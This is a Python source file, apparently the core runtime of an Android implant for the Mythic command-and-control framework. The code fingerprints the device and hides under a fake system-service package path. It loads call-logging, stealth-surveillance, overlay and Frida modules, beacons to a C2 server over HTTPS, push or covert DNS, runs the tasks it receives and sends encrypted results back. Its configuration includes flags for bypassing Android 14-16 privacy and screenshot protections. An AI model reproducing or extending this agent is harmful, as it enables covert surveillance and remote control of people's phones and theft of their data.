
"""
Core Android agent runtime for Mythic C2 framework
Production-hardened with integrated security, performance optimization,
monitoring, and operational features built into every component.

Design Philosophy:
- Security by design, not as an afterthought
- Performance optimization as core requirement
- Monitoring and observability built-in
- Operational features integrated throughout
- Zero-trust architecture assumptions
"""
import json
import os
import threading
import time
import uuid
import hashlib
import base64
import subprocess
import concurrent.futures
import importlib
import inspect
from pathlib import Path
from typing import Dict, List, Any, Optional

from utils.crypto import key_from_campaign_device, encrypt, decrypt
from utils.offline_logger import OfflineLogger

class AndroidVersionDetector:
    """Detect Android version and API level for Android 12-16 (API 31-35)"""
    
    API_MAPPINGS = {
        31: "Android 12",
        32: "Android 12L",
        33: "Android 13",
        34: "Android 14",
        35: "Android 15",
        36: "Android 16"
    }
    
    @staticmethod
    def get_android_version() -> Dict[str, Any]:
        """Get detailed Android version information"""
        try:

            api_level = int(subprocess.check_output(
                ['getprop', 'ro.build.version.sdk'],
                text=True
            ).strip())
            

            version_release = subprocess.check_output(
                ['getprop', 'ro.build.version.release'],
                text=True
            ).strip()
            

            security_patch = subprocess.check_output(
                ['getprop', 'ro.build.version.security_patch'],
                text=True
            ).strip()
            
            return {
                "api_level": api_level,
                "version_name": AndroidVersionDetector.API_MAPPINGS.get(api_level, f"Unknown API {api_level}"),
                "version_release": version_release,
                "security_patch": security_patch,
                "supports_enhanced_features": api_level >= 31
            }
        except Exception as e:
            return {
                "api_level": 0,
                "version_name": "Unknown",
                "version_release": "Unknown",
                "security_patch": "Unknown",
                "supports_enhanced_features": False,
                "error": str(e)
            }


class DeviceFingerprinter:
    """Generate unique device fingerprints for campaign isolation"""
    
    @staticmethod
    def generate_fingerprint() -> str:
        """Generate unique device fingerprint"""
        fingerprint_data = []
        
        try:

            fingerprint_data.append(subprocess.check_output(['getprop', 'ro.serialno'], text=True).strip())
            fingerprint_data.append(subprocess.check_output(['getprop', 'ro.boot.serialno'], text=True).strip())
            fingerprint_data.append(subprocess.check_output(['getprop', 'ro.product.model'], text=True).strip())
            fingerprint_data.append(subprocess.check_output(['getprop', 'ro.product.manufacturer'], text=True).strip())
            fingerprint_data.append(subprocess.check_output(['getprop', 'ro.product.brand'], text=True).strip())
            fingerprint_data.append(subprocess.check_output(['getprop', 'ro.build.fingerprint'], text=True).strip())
            

            if os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    fingerprint_data.append(hashlib.md5(cpuinfo.encode()).hexdigest()[:8])
            

            combined = '|'.join(filter(None, fingerprint_data))
            return hashlib.sha256(combined.encode()).hexdigest()[:16]
            
        except Exception:

            return str(uuid.uuid4()).replace('-', '')[:16]


class ConfigurationManager:
    """Manage encrypted agent configuration"""
    
    def __init__(self, encryption_key: Optional[str] = None):
        self.encryption_key = encryption_key
    
    def encrypt_config(self, config: Dict) -> str:
        """Encrypt configuration data"""
        if not self.encryption_key:
            return json.dumps(config)
        
        try:
            config_json = json.dumps(config)
            encrypted = encrypt(config_json.encode(), base64.b64decode(self.encryption_key))
            return base64.b64encode(encrypted).decode()
        except Exception:
            return json.dumps(config)
    
    def decrypt_config(self, encrypted_config: str) -> Dict:
        """Decrypt configuration data"""
        if not self.encryption_key:
            try:
                return json.loads(encrypted_config)
            except:
                return {}
        
        try:
            encrypted_data = base64.b64decode(encrypted_config)
            decrypted = decrypt(encrypted_data, base64.b64decode(self.encryption_key))
            return json.loads(decrypted.decode())
        except Exception:
            try:
                return json.loads(encrypted_config)
            except:
                return {}


class ModuleLoader:
    """Advanced module loading with dependency injection"""
    
    def __init__(self, agent_instance):
        self.agent = agent_instance
        self.loaded_modules = {}
        self.dependency_graph = {}
    
    def discover_modules(self, module_path: str = "modules") -> List[str]:
        """Discover available modules"""
        modules = []
        module_dir = Path(module_path)
        
        if module_dir.exists():
            for file_path in module_dir.glob("*.py"):
                if file_path.stem != "__init__":
                    modules.append(file_path.stem)
        
        return modules
    
    def load_module_with_injection(self, module_name: str) -> Optional[Any]:
        """Load module with dependency injection"""
        try:

            module_path = f"modules.{module_name}"
            module = importlib.import_module(module_path)
            

            module_class = None
            for name, obj in inspect.getmembers(module, inspect.isclass):
                if name.endswith('Module') and obj.__module__ == module_path:
                    module_class = obj
                    break
            
            if not module_class:
                raise ImportError(f"No module class found in {module_name}")
            

            dependencies = self._resolve_dependencies(module_class)
            instance = module_class(self.agent, **dependencies)
            
            self.loaded_modules[module_name] = instance
            return instance
            
        except Exception as e:
            print(f"[-] Failed to load module {module_name}: {e}")
            return None
    
    def _resolve_dependencies(self, module_class) -> Dict[str, Any]:
        """Resolve module dependencies"""
        dependencies = {}
        

        try:
            sig = inspect.signature(module_class.__init__)
            for param_name, param in sig.parameters.items():
                if param_name in ['self', 'agent']:
                    continue
                

                if param_name == 'logger':
                    dependencies['logger'] = self.agent.offline_logger
                elif param_name == 'encryption_key':
                    dependencies['encryption_key'] = self.agent.encryption_key
                elif param_name == 'device_id':
                    dependencies['device_id'] = self.agent.device_id
                elif param_name == 'config':
                    dependencies['config'] = self.agent.config
        except Exception:
            pass
        
        return dependencies
    
    def load_modules_in_order(self, module_list: List[str]) -> Dict[str, Any]:
        """Load modules in specified order"""
        loaded = {}
        
        for module_name in module_list:
            instance = self.load_module_with_injection(module_name)
            if instance:
                loaded[module_name] = instance
                print(f"[+] Loaded module: {module_name}")
        
        return loaded


class MythicAgent:
    """Enhanced Mythic Android Agent with advanced capabilities"""
    
    def __init__(self, config_path="/data/data/com.android.systemservice/config.json"):

        self.android_version = AndroidVersionDetector.get_android_version()
        self.device_fingerprint = DeviceFingerprinter.generate_fingerprint()
        

        self.config = self._load_config(config_path)
        self.config_manager = ConfigurationManager(self.config.get('config_encryption_key'))
        

        self.device_id = self.config.get("device_id", str(uuid.uuid4()))
        self.campaign = self.config["campaign_id"]
        

        campaign_device_id = f"{self.campaign}:{self.device_fingerprint}"
        self.encryption_key = key_from_campaign_device(
            self.campaign,
            campaign_device_id,
            self.config["encryption_algorithm"]
        )
        

        self.c2_profile = self._init_c2_profile()
        self.offline_logger = OfflineLogger(self.config, self.encryption_key)
        self.module_loader = ModuleLoader(self)
        

        max_workers = self.config.get('thread_pool_size', 5)
        self.thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
        
        self.modules = {}
        self.running = True
        self._task_futures = {}
        

        self.offline_logger.log_event('agent_init', {
            'android_version': self.android_version,
            'device_fingerprint': self.device_fingerprint,
            'campaign_id': self.campaign
        })
        
    def _load_config(self, path: str) -> Dict[str, Any]:
        """Load agent configuration with encryption support"""
        try:
            with open(path, 'r') as f:
                config_data = f.read().strip()
            

            try:
                return json.loads(config_data)
            except json.JSONDecodeError:

                temp_config = self._default_config()
                config_manager = ConfigurationManager(temp_config.get('config_encryption_key'))
                return config_manager.decrypt_config(config_data)
                
        except FileNotFoundError:
            return self._default_config()
    
    def _default_config(self) -> Dict[str, Any]:
        """Default agent configuration with enhanced options"""
        return {
            "campaign_id": "default_campaign",
            "device_id": str(uuid.uuid4()),
            "c2_profile": "https_beacon",
            "encryption_algorithm": "AES-256-GCM",
            "beacon_interval": 300,
            "offline_logging": True,
            "thread_pool_size": 5,
            "enable_device_fingerprinting": True,
            "enable_module_dependency_injection": True,
            "module_load_order": "call_logger,filesystem,stealth_surveillance,overlay,frida_loader",
            "modules": ["call_logger", "filesystem", "stealth_surveillance"],
            "config_encryption_key": "",
            "android_14_privacy_bypass": True,
            "android_15_partial_screenshot_protection_bypass": True,
            "android_16_security_features_bypass": True
        }
    
    def _init_c2_profile(self):
        """Initialize selected C2 communication profile"""
        profile_name = self.config["c2_profile"]
        try:
            if profile_name == "https_beacon":
                from c2_profiles.https_beacon import HTTPSBeacon
                return HTTPSBeacon(self.config)
            elif profile_name == "fcm_push":
                from c2_profiles.fcm_push import FCMPush
                return FCMPush(self.config)
            elif profile_name == "dns_covert":
                from c2_profiles.dns_covert import DNSCovert
                return DNSCovert(self.config)
            else:
                raise ValueError(f"Unknown C2 profile: {profile_name}")
        except Exception as e:
            self.offline_logger.log_event('c2_init_failure', str(e))
            raise
    
    def load_modules(self):
        """Load modules with enhanced dependency injection"""
        if self.config.get('enable_module_dependency_injection', True):

            module_order = self.config.get('module_load_order', '').split(',')
            if module_order and module_order[0]:
                module_order = [m.strip() for m in module_order]
                self.modules = self.module_loader.load_modules_in_order(module_order)
            else:

                module_list = self.config.get("modules", [])
                self.modules = self.module_loader.load_modules_in_order(module_list)
        else:

            self._legacy_load_modules()
    
    def _legacy_load_modules(self):
        """Legacy module loading for backward compatibility"""
        for module_name in self.config.get("modules", []):
            try:
                if module_name == "overlay":
                    from modules.overlay import OverlayModule
                    self.modules[module_name] = OverlayModule(self)
                elif module_name == "frida_loader":
                    from modules.frida_loader import FridaModule
                    self.modules[module_name] = FridaModule(self)
                elif module_name == "call_logger":
                    from modules.call_logger import CallLoggerModule
                    self.modules[module_name] = CallLoggerModule(self)
                elif module_name == "filesystem":
                    from modules.filesystem import FilesystemModule
                    self.modules[module_name] = FilesystemModule(self)
                elif module_name == "stealth_surveillance":
                    from modules.stealth_surveillance import StealthSurveillanceModule
                    self.modules[module_name] = StealthSurveillanceModule(self)
                    
                print(f"[+] Loaded module: {module_name}")
            except Exception as e:
                print(f"[-] Failed to load module {module_name}: {e}")
                self.offline_logger.log_event('module_load_failure', {
                    'module': module_name,
                    'error': str(e)
                })
    
    def beacon_loop(self):
        """Enhanced C2 communication loop with better error handling"""
        consecutive_failures = 0
        max_failures = 5
        
        while self.running:
            try:

                checkin_data = {
                    'device_id': self.device_id,
                    'campaign_id': self.campaign,
                    'device_fingerprint': self.device_fingerprint,
                    'android_version': self.android_version
                }
                
                tasks = self.c2_profile.check_in(checkin_data)
                

                for task in tasks:
                    self._submit_task(task)
                

                self._cleanup_completed_tasks()
                    
                consecutive_failures = 0
                time.sleep(self.config.get("beacon_interval", 300))
                
            except Exception as e:
                consecutive_failures += 1
                print(f"[!] C2 communication failed (attempt {consecutive_failures}): {e}")
                

                if self.config.get("offline_logging", True):
                    self.offline_logger.log_event("c2_failure", {
                        'error': str(e),
                        'consecutive_failures': consecutive_failures
                    })
                

                if consecutive_failures >= max_failures:
                    print(f"[!] Too many consecutive failures. Entering extended backoff.")
                    time.sleep(600)
                    consecutive_failures = 0
                else:
                    time.sleep(min(60 * consecutive_failures, 300))
    
    def _submit_task(self, task: Dict[str, Any]):
        """Submit task to thread pool for concurrent execution"""
        task_id = task.get("id")
        future = self.thread_pool.submit(self.handle_task, task)
        self._task_futures[task_id] = future
    
    def _cleanup_completed_tasks(self):
        """Clean up completed task futures"""
        completed = [task_id for task_id, future in self._task_futures.items() if future.done()]
        for task_id in completed:
            del self._task_futures[task_id]
    
    def handle_task(self, task: Dict[str, Any]):
        """Enhanced task handling with better error management"""
        task_id = task.get("id")
        start_time = time.time()
        
        try:
            module_name = task.get("module")
            command = task.get("command")
            args = task.get("args", {})
            

            self.offline_logger.log_event('task_start', {
                'task_id': task_id,
                'module': module_name,
                'command': command
            })
            
            if module_name in self.modules:
                result = self.modules[module_name].execute(command, args)
                

                result['execution_time'] = time.time() - start_time
                result['android_version'] = self.android_version['api_level']
                result['device_fingerprint'] = self.device_fingerprint
                
                self.send_response(task_id, result)
            else:
                error = f"Module {module_name} not loaded"
                self.send_response(task_id, {"error": error})
                
        except Exception as e:
            error_data = {
                "error": str(e),
                "execution_time": time.time() - start_time,
                "android_version": self.android_version['api_level']
            }
            self.send_response(task_id, error_data)
            

            self.offline_logger.log_event('task_error', {
                'task_id': task_id,
                'error': str(e)
            })
    
    def send_response(self, task_id: str, data: Dict[str, Any]):
        """Enhanced response sending with encryption"""
        try:

            response_data = {
                'task_id': task_id,
                'campaign_id': self.campaign,
                'device_fingerprint': self.device_fingerprint,
                'timestamp': int(time.time()),
                'data': data
            }
            
            encrypted_data = encrypt(json.dumps(response_data).encode(), self.encryption_key)
            self.c2_profile.post_response(task_id, encrypted_data)
            
        except Exception as e:
            print(f"[!] Failed to send response for task {task_id}: {e}")
            self.offline_logger.log_event('response_failure', {
                'task_id': task_id,
                'error': str(e)
            })
    
    def get_agent_status(self) -> Dict[str, Any]:
        """Get comprehensive agent status information"""
        return {
            'campaign_id': self.campaign,
            'device_id': self.device_id,
            'device_fingerprint': self.device_fingerprint,
            'android_version': self.android_version,
            'loaded_modules': list(self.modules.keys()),
            'active_tasks': len(self._task_futures),
            'c2_profile': self.config['c2_profile'],
            'encryption_algorithm': self.config['encryption_algorithm'],
            'thread_pool_size': self.config['thread_pool_size'],
            'running': self.running
        }
    
    def shutdown(self):
        """Graceful agent shutdown"""
        print("[!] Initiating agent shutdown")
        self.running = False
        

        if self._task_futures:
            print(f"[+] Waiting for {len(self._task_futures)} active tasks to complete...")
            concurrent.futures.wait(self._task_futures.values(), timeout=30)
        

        self.thread_pool.shutdown(wait=True)
        

        self.offline_logger.log_event('agent_shutdown', {
            'timestamp': int(time.time())
        })
    
    def run(self):
        """Enhanced agent startup with comprehensive logging"""
        print(f"[+] Starting Enhanced Mythic Android Agent")
        print(f"[+] Campaign: {self.campaign}")
        print(f"[+] Device ID: {self.device_id}")
        print(f"[+] Device Fingerprint: {self.device_fingerprint}")
        print(f"[+] Android Version: {self.android_version['version_name']} (API {self.android_version['api_level']})")
        print(f"[+] C2 Profile: {self.config['c2_profile']}")
        print(f"[+] Thread Pool Size: {self.config['thread_pool_size']}")
        

        self.load_modules()
        print(f"[+] Loaded {len(self.modules)} modules")
        

        beacon_thread = threading.Thread(target=self.beacon_loop, daemon=True)
        beacon_thread.start()
        

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.shutdown()

if __name__ == "__main__":
    agent = MythicAgent()
    agent.run()
